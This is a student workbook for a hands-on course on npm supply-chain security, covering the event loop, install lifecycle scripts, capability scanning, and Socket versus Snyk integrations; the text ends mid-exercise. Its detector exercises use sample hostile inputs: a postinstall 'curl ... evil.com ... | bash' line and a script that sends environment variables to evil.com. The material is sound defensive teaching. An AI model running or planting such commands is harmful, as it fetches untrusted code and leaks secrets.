# Student Workbook: Beyond CVEs - The Evolution of Software Composition Analysis

## Complete Hands-On Learning Guide

---

## HOW TO USE THIS WORKBOOK

This workbook is designed to accompany the tutorial series and slide deck. Each section corresponds to a phase in the tutorial and includes:

- **Learning Objectives** - What you'll accomplish
- **Key Concepts** - Important terms and ideas
- **Code Exercises** - Hands-on coding activities
- **Check Your Understanding** - Knowledge check questions
- **Challenge Questions** - Deeper thinking questions
- **Lab Activities** - Practical lab exercises
- **Self-Assessment** - Track your progress

### Workbook Structure

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          WORKBOOK STRUCTURE                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  PART 0: Introduction                                                       │
│  ├── Course Overview                                                       │
│  ├── Environment Setup                                                     │
│  └── Pre-Course Self-Assessment                                           │
│                                                                              │
│  PART 1: Foundations (Phase 1)                                            │
│  ├── Module 1.1: JavaScript Execution Model                              │
│  ├── Module 1.2: npm Install Lifecycle                                   │
│  ├── Module 1.3: Building the Scanner                                    │
│  └── Module 1.4: Module 1 Review                                         │
│                                                                              │
│  PART 2: Modern Dependency Risk Analysis (Phase 2)                       │
│  ├── Module 2.1: Package Manifest Analysis                              │
│  ├── Module 2.2: Capability Scanning                                    │
│  ├── Module 2.3: Socket vs. Snyk Comparison                            │
│  └── Module 2.4: Module 2 Review                                        │
│                                                                              │
│  PART 3: Async Execution & Orchestration (Phase 3)                      │
│  ├── Module 3.1: Concurrency Patterns                                   │
│  ├── Module 3.2: Resource Management                                    │
│  ├── Module 3.3: Priority Queuing                                       │
│  └── Module 3.4: Module 3 Review                                        │
│                                                                              │
│  PART 4: AI-Augmented Security (Phase 4)                                │
│  ├── Module 4.1: LLM Integration                                        │
│  ├── Module 4.2: Prompt Engineering                                     │
│  ├── Module 4.3: CI/CD Integration                                      │
│  └── Module 4.4: Module 4 Review                                        │
│                                                                              │
│  APPENDICES                                                               │
│  ├── A: Code Reference                                                   │
│  ├── B: API Reference                                                    │
│  ├── C: Troubleshooting Guide                                            │
│  └── D: Final Project                                                   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## PART 0: INTRODUCTION

### Course Overview

**Welcome to Beyond CVEs: The Evolution of Software Composition Analysis**

This course will take you from understanding the basics of JavaScript package security to building a complete, production-ready, AI-augmented security scanning system.

**What You'll Build:**
1. A JavaScript execution model visualizer
2. A behavioral capability scanner
3. A concurrent package scanning engine
4. An AI-augmented security analysis pipeline
5. A CI/CD integration system

**What You'll Learn:**
- How JavaScript packages execute during installation
- How to detect malicious package behavior
- How to build scalable security scanners
- How to integrate AI into security workflows
- How to deploy security tools in CI/CD pipelines

### Environment Setup

Before starting the course, set up your development environment:

#### Step 1: Install Prerequisites

```bash
# Check Node.js version (must be 18.x or higher)
node --version

# Check npm version (must be 9.x or higher)
npm --version

# Install global tools
npm install -g nodemon
npm install -g json
npm install -g serve
```

#### Step 2: Create Project Directory

```bash
# Create the tutorial directory
mkdir -p ~/projects/beyond-cves-tutorial
cd ~/projects/beyond-cves-tutorial

# Verify setup
pwd
# Should output: /Users/yourname/projects/beyond-cves-tutorial
```

#### Step 3: Set Up API Keys (Optional)

```bash
# Create .env file
touch .env

# Add your API keys (if you have them)
echo "OPENAI_API_KEY=your_key_here" >> .env
echo "SNYK_API_KEY=your_key_here" >> .env
echo "SOCKET_API_KEY=your_key_here" >> .env
```

#### Step 4: Test Setup

```bash
# Create a test file
echo 'console.log("Setup successful!")' > test.js

# Run it
node test.js
# Expected output: Setup successful!
```

### Pre-Course Self-Assessment

Rate your confidence level (1 = Low, 5 = High):

| Skill | 1 | 2 | 3 | 4 | 5 |
|-------|---|---|---|---|---|
| JavaScript/Node.js | ○ | ○ | ○ | ○ | ○ |
| npm package management | ○ | ○ | ○ | ○ | ○ |
| Security concepts | ○ | ○ | ○ | ○ | ○ |
| Async/await | ○ | ○ | ○ | ○ | ○ |
| Command line | ○ | ○ | ○ | ○ | ○ |

---

## PART 1: FOUNDATIONS

### Module 1.1: JavaScript Execution Model

#### Learning Objectives
- Understand the call stack, heap, and event loop
- Explain the difference between microtasks and macrotasks
- Identify how malicious packages exploit the event loop
- Visualize JavaScript execution order

#### Key Concepts

**Call Stack**
The call stack is a LIFO (Last In, First Out) data structure that tracks function execution. When a function is called, it's pushed onto the stack; when it returns, it's popped off.

**Heap**
The heap is a region of memory where objects, functions, and closures are stored.

**Event Loop**
The event loop continuously checks if the call stack is empty and processes tasks from the microtask and macrotask queues.

**Microtasks vs Macrotasks**
- **Microtasks**: process.nextTick, Promise.then, queueMicrotask (higher priority)
- **Macrotasks**: setTimeout, setInterval, setImmediate, I/O operations (lower priority)

#### Code Exercise 1.1.1: Call Stack Visualization

**📁 File:** `phase-1/01-call-stack-visualizer.js`

```javascript
// Complete the code to visualize the call stack
function functionA() {
    console.log('A started');
    functionB();
    console.log('A finished');
}

function functionB() {
    console.log('B started');
    functionC();
    console.log('B finished');
}

function functionC() {
    console.log('C started');
    // Add a console.log to show C finished
    // YOUR CODE HERE
}

// Call functionA
// YOUR CODE HERE

// QUESTION: What order will the console.log statements appear?
// Write your prediction:
// 1. __________________
// 2. __________________
// 3. __________________
// 4. __________________
// 5. __________________
// 6. __________________
```

**✏️ Your Prediction:**
```
1. 
2. 
3. 
4. 
5. 
6. 
```

**✅ Run & Verify:**
```bash
node phase-1/01-call-stack-visualizer.js
```

#### Code Exercise 1.1.2: Event Loop Order

**📁 File:** `phase-1/02-event-loop-demo.js`

```javascript
// Complete the event loop demonstration
console.log('1. Synchronous code');

setTimeout(() => {
    console.log('? - setTimeout');
}, 0);

Promise.resolve().then(() => {
    console.log('? - Promise');
});

process.nextTick(() => {
    console.log('? - process.nextTick');
});

queueMicrotask(() => {
    console.log('? - queueMicrotask');
});

console.log('2. Synchronous code');

// QUESTION: Write the expected execution order:
// 1. __________________
// 2. __________________
// 3. __________________
// 4. __________________
// 5. __________________
// 6. __________________
```

**✏️ Fill in the blanks:**
1. Which executes first: `setTimeout` or `Promise.then`? _____________
2. What is the priority order of microtasks? _______________________
3. When does the event loop process macrotasks? ____________________
4. What happens if you have an infinite loop in synchronous code? _________

**✅ Run & Verify:**
```bash
node phase-1/02-event-loop-demo.js
```

#### Lab Activity 1.1: Malicious Package Simulation

**📁 File:** `phase-1/04-malicious-package-simulator.js`

```javascript
// Simulate a malicious package
console.log('📦 Simulating malicious package...');

// 1. Synchronous reconnaissance
// Add code to read the current directory
// YOUR CODE HERE

// 2. Microtask hijacking
// Add code that runs in a microtask
// YOUR CODE HERE

// 3. Macrotask for delayed execution
// Add code that runs after a delay
// YOUR CODE HERE
```

**🔍 Observation Questions:**
1. What information could a malicious package collect synchronously?
_________________________________________________________________
2. Why would an attacker use microtasks?
_________________________________________________________________
3. What are the advantages of delayed execution via macrotasks?
_________________________________________________________________

#### Check Your Understanding (Module 1.1)

**Multiple Choice:**

1. Which of the following has the highest priority in the event loop?
   - [ ] setTimeout
   - [ ] Promise.then
   - [ ] process.nextTick
   - [ ] I/O operations

2. What is the call stack?
   - [ ] A region of memory for objects
   - [ ] A LIFO structure for function execution
   - [ ] A queue for asynchronous operations
   - [ ] A cache for function results

3. True or False: setTimeout(0) guarantees immediate execution.
   - [ ] True
   - [ ] False

**Short Answer:**

4. Explain why malicious packages might use `process.nextTick` instead of `setTimeout`.
_________________________________________________________________
_________________________________________________________________

5. What is the relationship between the call stack, event loop, and microtask queue?
_________________________________________________________________
_________________________________________________________________

---

### Module 1.2: npm Install Lifecycle

#### Learning Objectives
- Identify all npm lifecycle phases
- Understand the security implications of each phase
- Detect suspicious install scripts
- Analyze package.json for risks

#### Key Concepts

**npm Install Lifecycle Phases**

```
┌─────────────────────────────────────────────────────────────────────┐
│                    NPM INSTALL LIFECYCLE                            │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  Phase 1: PREINSTALL      │  Runs BEFORE installation              │
│                           │  ⚠️ HIGH RISK                         │
│  Phase 2: FETCH           │  Downloads package from registry       │
│                           │  ⚠️ MITM risk                         │
│  Phase 3: INSTALL         │  Runs DURING installation             │
│                           │  ⚠️ CRITICAL RISK                    │
│  Phase 4: POSTINSTALL     │  Runs AFTER installation              │
│                           │  ⚠️ CRITICAL RISK                    │
│  Phase 5: DEPENDENCIES    │  Installs dependencies                │
│                           │  ⚠️ HIGH RISK                        │
└─────────────────────────────────────────────────────────────────────┘
```

**Lifecycle Script Risks**

| Script | Risk Level | What Could Happen |
|--------|------------|-------------------|
| preinstall | HIGH | Run before any security checks |
| install | CRITICAL | Full execution during installation |
| postinstall | CRITICAL | Most common attack vector |
| preuninstall | MEDIUM | Can prevent uninstallation |
| prepare | HIGH | Runs on install and publish |

#### Code Exercise 1.2.1: Package.json Analysis

**📁 File:** `phase-1/06-lifecycle-tracer.js`

```javascript
// Analyze package.json for suspicious scripts
const suspiciousPatterns = [
    // Add at least 5 suspicious patterns
    // Example: 'exec'
    // YOUR CODE HERE
];

function analyzeScripts(scripts) {
    const findings = [];
    
    for (const [name, command] of Object.entries(scripts)) {
        // Check each script against patterns
        // YOUR CODE HERE
    }
    
    return findings;
}

// Test with a sample package.json
const testPackage = {
    scripts: {
        postinstall: 'curl http://evil.com/setup.sh | bash',
        test: 'echo "Running tests"',
        build: 'npm run build'
    }
};

// Run the analysis
const results = analyzeScripts(testPackage.scripts);
console.log(results);
```

**✏️ Complete the Code:**

1. Add at least 5 suspicious patterns to the array:
   - Pattern for shell commands: _________________
   - Pattern for network operations: _________________
   - Pattern for file operations: _________________
   - Pattern for environment access: _________________
   - Pattern for eval: _________________

2. Implement the check logic:
```javascript
// YOUR CODE HERE
```

**✅ Run & Verify:**
```bash
node phase-1/06-lifecycle-tracer.js
```

#### Lab Activity 1.2: Malicious Script Detection

**📁 File:** `phase-1/07-malicious-detector.js`

```javascript
// Complete the malicious script detector

class MaliciousScriptDetector {
    constructor() {
        this.detectionRules = [
            // Add detection rules
            // YOUR CODE HERE
        ];
    }

    detect(scriptContent) {
        const findings = [];
        
        // Check each rule
        // YOUR CODE HERE
        
        return findings;
    }

    getRiskScore(findings) {
        // Calculate risk score based on findings
        // YOUR CODE HERE
        return 0;
    }
}

// Test with a sample script
const detector = new MaliciousScriptDetector();
const maliciousScript = `
    const fs = require('fs');
    const https = require('https');
    const env = process.env;
    https.get('https://evil.com/collect?data=' + JSON.stringify(env));
`;

const result = detector.detect(maliciousScript);
console.log('Findings:', result);
```

**🔍 Observation Questions:**

1. What patterns would you look for to detect data exfiltration?
_________________________________________________________________
2. How would you detect shell command execution?
_________________________________________________________________
3. What makes a script "malicious" vs "suspicious"?
_________________________________________________________________

#### Check Your Understanding (Module 1.2)

**Matching: Match the script to its security risk level**

| Script | Risk Level |
|--------|------------|
| 1. postinstall | A. LOW |
| 2. test | B. MEDIUM |
| 3. preinstall | C. HIGH |
| 4. preuninstall | D. CRITICAL |
| 5. uninstall | E. HIGH |

**Answers:**
1. _____ 2. _____ 3. _____ 4. _____ 5. _____

**Short Answer:**

6. Why is `postinstall` the most common attack vector?
_________________________________________________________________
7. What is the difference between `install` and `postinstall`?
_________________________________________________________________
8. What would you check to determine if a package is malicious?
_________________________________________________________________

---

### Module 1.3: Building the Scanner

#### Learning Objectives
- Build a complete security scanner
- Implement risk scoring
- Generate security reports
- Integrate with CI/CD

#### Key Concepts

**Scanner Architecture**

```
┌─────────────────────────────────────────────────────────────────────┐
│                    SCANNER ARCHITECTURE                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  INPUT: Package Directory                                           │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────┐    │
│  │  Step 1: Parse package.json                                │    │
│  │  ├─ Extract scripts, dependencies, metadata                │    │
│  │  └─ Identify lifecycle scripts                             │    │
│  └────────────────────────────────────────────────────────────┘    │
│                              │                                      │
│  ┌────────────────────────────────────────────────────────────┐    │
│  │  Step 2: Scan Dependencies                                 │    │
│  │  ├─ Read lock file (package-lock.json)                    │    │
│  │  ├─ Check for vulnerabilities                             │    │
│  │  └─ Analyze dependency tree                               │    │
│  └────────────────────────────────────────────────────────────┘    │
│                              │                                      │
│  ┌────────────────────────────────────────────────────────────┐    │
│  │  Step 3: Behavioral Analysis                              │    │
│  │  ├─ Scan JavaScript files                                 │    │
│  │  ├─ Detect dangerous capabilities                         │    │
│  │  └─ Identify suspicious patterns                          │    │
│  └────────────────────────────────────────────────────────────┘    │
│                              │                                      │
│  ┌────────────────────────────────────────────────────────────┐    │
│  │  Step 4: Risk Scoring                                     │    │
│  │  ├─ Calculate overall risk score                          │    │
│  │  ├─ Determine risk level                                  │    │
│  │  └─ Generate recommendations                              │    │
│  └────────────────────────────────────────────────────────────┘    │
│                              │                                      │
│  OUTPUT: Security Report                                          │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

#### Code Exercise 1.3.1: Risk Scoring

**📁 File:** `phase-1/08-complete-scanner.js`

```javascript
// Implement risk scoring

function calculateRiskScore(findings) {
    // Define severity weights
    const severityScores = {
        CRITICAL: 25,
        HIGH: 15,
        MEDIUM: 8,
        LOW: 3,
        INFO: 0
    };

    let totalScore = 0;
    let criticalCount = 0;
    let highCount = 0;

    // Calculate score from findings
    // YOUR CODE HERE

    // Calculate risk level
    let riskLevel = 'LOW';
    // YOUR CODE HERE

    return {
        score: totalScore,
        level: riskLevel,
        criticalCount,
        highCount
    };
}

// Test with sample findings
const sampleFindings = [
    { severity: 'CRITICAL', description: 'Shell execution detected' },
    { severity: 'HIGH', description: 'Network access detected' },
    { severity: 'MEDIUM', description: 'Environment access detected' },
    { severity: 'LOW', description: 'Suspicious package name' }
];

const result = calculateRiskScore(sampleFindings);
console.log('Risk Score:', result.score);
console.log('Risk Level:', result.level);
console.log('Critical Count:', result.criticalCount);
console.log('High Count:', result.highCount);

// QUESTION: What is a "critical" risk?
// YOUR ANSWER: _________________________________
```

**✏️ Complete the Code:**

1. Implement the score calculation:
```javascript
// YOUR CODE HERE
```

2. Implement the risk level determination:
```javascript
// YOUR CODE HERE
```

**✅ Run & Verify:**
```bash
node phase-1/08-complete-scanner.js
```

#### Lab Activity 1.3: Complete Security Scan

**📁 File:** `phase-1/09-ci-integration.js`

```javascript
// Complete the CI/CD integration script

class CICDIntegration {
    constructor(options = {}) {
        this.options = {
            failOnCritical: options.failOnCritical !== false,
            failOnHigh: options.failOnHigh || false,
            // YOUR CODE HERE
        };
    }

    async run() {
        console.log('🔍 Running security scan in CI mode...');
        
        // 1. Scan the project
        // YOUR CODE HERE

        // 2. Check for failures
        // YOUR CODE HERE

        // 3. Generate report
        // YOUR CODE HERE

        // 4. Exit with appropriate code
        // YOUR CODE HERE
    }
}

// Export for use
module.exports = CICDIntegration;
```

**🔍 Observation Questions:**

1. When should a build fail in CI/CD?
_________________________________________________________________
2. What should you do if you find critical vulnerabilities?
_________________________________________________________________
3. How can you override a policy decision?
_________________________________________________________________

#### Check Your Understanding (Module 1.3)

**Scenario-Based Questions:**

**Scenario 1:** You're scanning a package that has 3 critical findings, 2 high findings, and 10 low findings. What is the risk level?
- [ ] CRITICAL
- [ ] HIGH
- [ ] MEDIUM
- [ ] LOW

**Scenario 2:** A package has a `postinstall` script that reads `process.env` and sends the data to a remote server. What risk level would you assign?
_________________________________________________________________

**Scenario 3:** You find a package with high download numbers but a suspicious name (e.g., "expresss"). What should you do?
_________________________________________________________________

**Design Questions:**

4. What factors would you include in a risk score?
_________________________________________________________________

5. How would you handle false positives?
_________________________________________________________________

---

### Module 1.4: Module 1 Review

#### Self-Assessment

Rate your understanding of each topic (1 = Need Help, 5 = Expert):

| Topic | 1 | 2 | 3 | 4 | 5 |
|-------|---|---|---|---|---|
| JavaScript Event Loop | ○ | ○ | ○ | ○ | ○ |
| Call Stack vs Heap | ○ | ○ | ○ | ○ | ○ |
| npm Install Lifecycle | ○ | ○ | ○ | ○ | ○ |
| Malicious Script Detection | ○ | ○ | ○ | ○ | ○ |
| Risk Scoring | ○ | ○ | ○ | ○ | ○ |
| CI/CD Integration | ○ | ○ | ○ | ○ | ○ |

#### Module 1 Challenge Problems

**Challenge 1: Event Loop Starvation**

Write code that demonstrates event loop starvation (blocking the event loop), then fix it.

```javascript
// ❌ BAD: Blocks the event loop
function processArray(arr) {
    for (let i = 0; i < arr.length; i++) {
        // Heavy computation
        arr[i] = heavyOperation(arr[i]);
    }
    return arr;
}

// ✅ GOOD: Yield to the event loop
function processArrayWithYield(arr) {
    // YOUR CODE HERE
}
```

**Challenge 2: Script Detection**

Write a function that detects `eval` usage in JavaScript code and determines if it's dangerous.

```javascript
function detectEval(code) {
    // YOUR CODE HERE
    
    // Return { found: boolean, dangerous: boolean, location: string }
}
```

**Challenge 3: Risk Report Generator**

Generate a formatted report from scan results.

```javascript
function generateReport(results) {
    // YOUR CODE HERE
    
    // Return { summary: string, details: string[], recommendations: string[] }
}
```

#### Module 1 Summary

**Key Takeaways:**

1. **JavaScript Execution Model**: Understanding the call stack, heap, and event loop is crucial for understanding how malicious packages execute.

2. **npm Install Lifecycle**: Each phase of installation presents an opportunity for attack, especially `preinstall`, `install`, and `postinstall`.

3. **Behavioral Detection**: Looking for suspicious patterns in scripts is essential for detecting threats before they have CVEs.

4. **Risk Scoring**: Combining multiple factors (severity, frequency, context) provides a comprehensive risk assessment.

5. **CI/CD Integration**: Automated security checks in the pipeline prevent vulnerable packages from reaching production.

**What's Next:** In Module 2, you'll dive deeper into package analysis, capability scanning, and comparing security tools.

---

## PART 2: MODERN DEPENDENCY RISK ANALYSIS

### Module 2.1: Package Manifest Analysis

#### Learning Objectives
- Parse and analyze package.json and lock files
- Detect dependency confusion attacks
- Identify typosquatting attempts
- Assess package health and trust

#### Key Concepts

**Package.json Deep Dive**

```json
{
  "name": "my-package",        // Package identity
  "version": "1.0.0",          // Semantic versioning
  "scripts": {},               // Lifecycle scripts
  "dependencies": {},          // Production dependencies
  "devDependencies": {},       // Development dependencies
  "peerDependencies": {},      // Required peer dependencies
  "private": false             // Public vs private
}
```

**Lock File Analysis**

The lock file (package-lock.json) contains:
- Exact versions of all dependencies
- Integrity hashes
- Resolved registry URLs

**Dependency Confusion**

An attack where a private/internal package name is published to the public registry with a higher version number.

#### Code Exercise 2.1.1: Package Analyzer

**📁 File:** `phase-2/src/package-analyzer.js`

```javascript
// Complete the package analyzer

class PackageAnalyzer {
    constructor(packagePath) {
        this.packagePath = packagePath;
        this.packageJson = null;
        this.lockFile = null;
    }

    async analyze() {
        // 1. Load package.json
        // YOUR CODE HERE

        // 2. Load lock file
        // YOUR CODE HERE

        // 3. Analyze dependencies
        // YOUR CODE HERE

        // 4. Detect dependency confusion
        // YOUR CODE HERE

        // 5. Return results
        // YOUR CODE HERE
    }

    detectDependencyConfusion() {
        // Check if package is private
        // YOUR CODE HERE
        
        // Check for unscoped dependencies
        // YOUR CODE HERE
        
        // Check for suspicious version numbers
        // YOUR CODE HERE
    }
}

// Test the analyzer
const analyzer = new PackageAnalyzer('./package.json');
const results = await analyzer.analyze();
console.log(results);
```

**✏️ Complete the Code:**

1. Load and parse package.json:
```javascript
// YOUR CODE HERE
```

2. Detect dependency confusion:
```javascript
// YOUR CODE HERE
```

3. Check for typosquatting:
```javascript
// YOUR CODE HERE
```

**✅ Run & Verify:**
```bash
node phase-2/test-analyzer.js
```

#### Lab Activity 2.1: Dependency Tree Analysis

**📁 File:** `phase-2/src/package-analyzer.js` (continued)

```javascript
// Implement dependency tree analysis

analyzeDependencyTree() {
    const tree = {
        name: this.packageJson.name,
        version: this.packageJson.version,
        dependencies: []
    };

    // Build the dependency tree
    // YOUR CODE HERE

    // Check for circular dependencies
    // YOUR CODE HERE

    // Find vulnerable paths
    // YOUR CODE HERE

    return tree;
}

findVulnerablePaths(riskLevel = 'HIGH') {
    // Find dependencies at or above the risk level
    // YOUR CODE HERE
    
    // Return paths
    // YOUR CODE HERE
}
```

**🔍 Observation Questions:**

1. How can dependency tree analysis help identify security issues?
_________________________________________________________________
2. What are the risks of deep dependency trees?
_________________________________________________________________
3. How would you detect dependency confusion in a large project?
_________________________________________________________________

#### Check Your Understanding (Module 2.1)

**Multiple Choice:**

1. Which of the following indicates a dependency confusion attack?
   - [ ] Scoped dependencies (@company/package)
   - [ ] Private package with unscoped dependencies
   - [ ] Public package with scoped dependencies
   - [ ] Using lock files

2. What information does a lock file contain?
   - [ ] Only the top-level dependencies
   - [ ] Exact versions and integrity hashes
   - [ ] Only the package names
   - [ ] Only the version ranges

3. True or False: Typosquatting only affects popular packages.
   - [ ] True
   - [ ] False

**Short Answer:**

4. What is the difference between `dependencies` and `devDependencies`?
_________________________________________________________________
5. Why would an attacker publish a package with a version number like "999.0.0"?
_________________________________________________________________

---

### Module 2.2: Capability Scanning

#### Learning Objectives
- Understand behavioral capability scanning
- Detect dangerous package capabilities
- Analyze package source code
- Score capabilities by risk level

#### Key Concepts

**Capability Types**

| Capability | Risk | Description |
|------------|------|-------------|
| FILESYSTEM_ACCESS | HIGH | Read, write, delete files |
| NETWORK_ACCESS | HIGH | Outbound network connections |
| SHELL_EXECUTION | CRITICAL | Execute system commands |
| ENVIRONMENT_ACCESS | MEDIUM | Read environment variables |
| DYNAMIC_CODE | CRITICAL | eval, Function, vm execution |
| NATIVE_BINARIES | HIGH | Load native code (.node files) |
| TELEMETRY | MEDIUM | Collect usage data |
| CRYPTOGRAPHY | MEDIUM | Encryption/decryption operations |

**AST-Based Analysis**

Instead of executing code, capability scanners parse the code into an Abstract Syntax Tree (AST) and analyze the structure.

```
┌─────────────────────────────────────────────────────────────────────┐
│                    AST ANALYSIS PROCESS                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  Code: const fs = require('fs'); fs.readFileSync('/etc/passwd');   │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────┐    │
│  │  AST Analysis                                              │    │
│  │                                                             │    │
│  │  VariableDeclaration: const → fs = require('fs')          │    │
│  │  MemberExpression: fs.readFileSync                         │    │
│  │  CallExpression: fs.readFileSync('/etc/passwd')           │    │
│  │                                                             │    │
│  │  Detection: Filesystem Access (HIGH RISK)                 │    │
│  └────────────────────────────────────────────────────────────┘    │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

#### Code Exercise 2.2.1: Capability Scanner

**📁 File:** `phase-2/src/capability-scanner.js`

```javascript
// Complete the capability scanner

class CapabilityScanner {
    constructor(packagePath) {
        this.packagePath = packagePath;
        this.capabilities = [];
    }

    async scan() {
        // 1. Find all JavaScript files
        // YOUR CODE HERE

        // 2. Analyze each file
        // YOUR CODE HERE

        // 3. Collect capabilities
        // YOUR CODE HERE

        // 4. Calculate risk score
        // YOUR CODE HERE

        return {
            capabilities: this.capabilities,
            riskScore: this.calculateRiskScore(),
            riskLevel: this.determineRiskLevel()
        };
    }

    analyzeFile(filePath) {
        const content = fs.readFileSync(filePath, 'utf8');
        const ast = this.parseJavaScript(content);
        
        // Detect capabilities in the AST
        // YOUR CODE HERE
    }

    detectFilesystemAccess(node) {
        // Look for fs. readFile, writeFile, etc.
        // YOUR CODE HERE
    }
}

// Test the scanner
const scanner = new CapabilityScanner('./test-package');
const results = await scanner.scan();
console.log('Capabilities:', results.capabilities);
console.log('Risk Score:', results.riskScore);
console.log('Risk Level:', results.riskLevel);
```

**✏️ Complete the Code:**

1. Find all JavaScript files:
```javascript
// YOUR CODE HERE
```

2. Parse JavaScript into AST:
```javascript
// YOUR CODE HERE
```

3. Detect filesystem access:
```javascript
// YOUR CODE HERE
```

**✅ Run & Verify:**
```bash
node phase-2/test-capability-scanner.js
```

#### Lab Activity 2.2: Detecting Shell Execution

**📁 File:** `phase-2/src/capability-scanner.js` (continued)

```javascript
// Implement shell execution detection

detectShellExecution(node) {
    // Pattern 1: child_process.exec
    // YOUR CODE HERE

    // Pattern 2: child_process.spawn
    // YOUR CODE HERE

    // Pattern 3: Shell injection patterns
    // YOUR CODE HERE
}

detectShellInjection(code) {
    // Look for template literals in shell commands
    // YOUR CODE HERE

    // Look for user input in shell commands
    // YOUR CODE HERE

    // Look for dangerous commands
    // YOUR CODE HERE
}
```

**🔍 Observation Questions:**

1. What makes shell execution particularly dangerous?
_________________________________________________________________
2. How can you detect shell injection vulnerabilities?
_________________________________________________________________
3. What's the difference between `exec` and `spawn` in terms of security?
_________________________________________________________________

#### Check Your Understanding (Module 2.2)

**Matching: Match the capability to its risk level**

| Capability | Risk Level |
|------------|------------|
| 1. FILESYSTEM_ACCESS | A. CRITICAL |
| 2. NETWORK_ACCESS | B. HIGH |
| 3. SHELL_EXECUTION | C. HIGH |
| 4. ENVIRONMENT_ACCESS | D. MEDIUM |
| 5. DYNAMIC_CODE | E. CRITICAL |
| 6. NATIVE_BINARIES | F. HIGH |

**Answers:**
1. _____ 2. _____ 3. _____ 4. _____ 5. _____ 6. _____

**Short Answer:**

7. Why is dynamic code execution (eval) considered critical risk?
_________________________________________________________________
8. What's the difference between capability scanning and vulnerability scanning?
_________________________________________________________________
9. How would you detect a package that uses network access to exfiltrate data?
_________________________________________________________________

---

### Module 2.3: Socket vs. Snyk Comparison

#### Learning Objectives
- Understand the different approaches of Socket and Snyk
- Integrate both tools into a unified system
- Compare and contrast their findings
- Generate comprehensive security reports

#### Key Concepts

**Socket Architecture**

Focus: Behavioral analysis and supply chain security

```
┌─────────────────────────────────────────────────────────────────────┐
│                    SOCKET ARCHITECTURE                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  Input: Package Name + Version                                     │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────┐    │
│  │  Analysis Pipeline:                                        │    │
│  │  1. Download package                                        │    │
│  │  2. Extract and analyze files                               │    │
│  │  3. Detect capabilities                                     │    │
│  │  4. Identify supply chain risks                            │    │
│  │  5. Score behavioral risk                                  │    │
│  └────────────────────────────────────────────────────────────┘    │
│                                                                      │
│  Strengths:                                                         │
│  • Zero-day detection                                              │
│  • Behavioral analysis                                             │
│  • Supply chain attack detection                                   │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

**Snyk Architecture**

Focus: Vulnerability detection and remediation

```
┌─────────────────────────────────────────────────────────────────────┐
│                    SNYK ARCHITECTURE                                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  Input: Package Name + Version                                     │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────┐    │
│  │  Analysis Pipeline:                                        │    │
│  │  1. Query vulnerability database                          │    │
│  │  2. Match CVEs to package                                  │    │
│  │  3. Check dependency tree                                  │    │
│  │  4. Identify vulnerable paths                             │    │
│  │  5. Provide remediation advice                            │    │
│  └────────────────────────────────────────────────────────────┘    │
│                                                                      │
│  Strengths:                                                         │
│  • Comprehensive CVE database                                     │
│  • Detailed remediation advice                                     │
│  • Integration with existing tools                                │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

#### Code Exercise 2.3.1: Socket Integration

**📁 File:** `phase-2/src/socket-integration.js`

```javascript
// Complete the Socket integration

class SocketIntegration {
    constructor(apiKey) {
        this.apiKey = apiKey;
        this.baseUrl = 'https://api.socket.dev/v1';
    }

    async analyzePackage(name, version = 'latest') {
        // 1. Get package analysis
        // YOUR CODE HERE

        // 2. Get capabilities
        // YOUR CODE HERE

        // 3. Get risks
        // YOUR CODE HERE

        // 4. Calculate score
        // YOUR CODE HERE

        return {
            name,
            version,
            analysis: /* YOUR CODE */,
            capabilities: /* YOUR CODE */,
            risks: /* YOUR CODE */,
            score: /* YOUR CODE */
        };
    }

    normalizeCapabilities(data) {
        // Map Socket capabilities to standard format
        // YOUR CODE HERE
    }
}

// Test the integration
const socket = new SocketIntegration(process.env.SOCKET_API_KEY);
const results = await socket.analyzePackage('express', '4.18.2');
console.log('Socket Results:', results);
```

**✏️ Complete the Code:**

1. Implement the package analysis request:
```javascript
// YOUR CODE HERE
```

2. Normalize capabilities:
```javascript
// YOUR CODE HERE
```

3. Calculate the score:
```javascript
// YOUR CODE HERE
```

**✅ Run & Verify:**
```bash
node phase-2/test-comparative.js
```

#### Code Exercise 2.3.2: Snyk Integration

**📁 File:** `phase-2/src/snyk-integration.js`

```javascript
// Complete the Snyk integration

class SnykIntegration {
    constructor(apiKey, orgId) {
        this.apiKey = apiKey;
        this.orgId = orgId;
        this.baseUrl = 'https://api.snyk.io/rest';
    }

    async analyzePackage(name, version = 'latest', ecosystem = 'npm') {
        // 1. Get vulnerabilities
        // YOUR CODE HERE

        // 2. Get dependencies
        // YOUR CODE HERE

        // 3. Get remediation advice
        // YOUR CODE HERE

        // 4. Calculate score
        // YOUR CODE HERE

        return {
            name,
            version,
            vulnerabilities: /* YOUR CODE */,
            dependencies: /* YOUR CODE */,
            remediation: /* YOUR CODE */,
            score: /* YOUR CODE */
        };
    }

    normalizeVulnerabilities(data) {
        // Map Snyk vulnerabilities to standard format
        // YOUR CODE HERE
    }
}

// Test the integration
const snyk = new SnykIntegration(process.env.SNYK_API_KEY, process.env.SNYK_ORG_ID);
const results = await snyk.analyzePackage('express', '4.18.2');
console.log('Snyk Results:', results);
```

**✏️ Complete the Code:**

1. Implement the vulnerability request:
```javascript
// YOUR CODE HERE
```

2. Normalize vulnerabilities:
```javascript
// YOUR CODE HERE
```

3. Calculate the score:
```javascript
// YOUR CODE HERE
```

#### Lab Activity 2.3: Comparative Analysis

**📁 File:** `phase-2/src/comparative-analyzer.js`

```javascript
// Complete the comparative analyzer

class ComparativeAnalyzer {
    constructor(socketApiKey, snykApiKey, snykOrgId) {
        this.socket = new SocketIntegration(socketApiKey);
        this.snyk = new SnykIntegration(snykApiKey, snykOrgId);
    }

    async compare(name, version = 'latest') {
        // 1. Get both analyses
        // YOUR CODE HERE

        // 2. Compare results
        // YOUR CODE HERE

        // 3. Identify conflicts
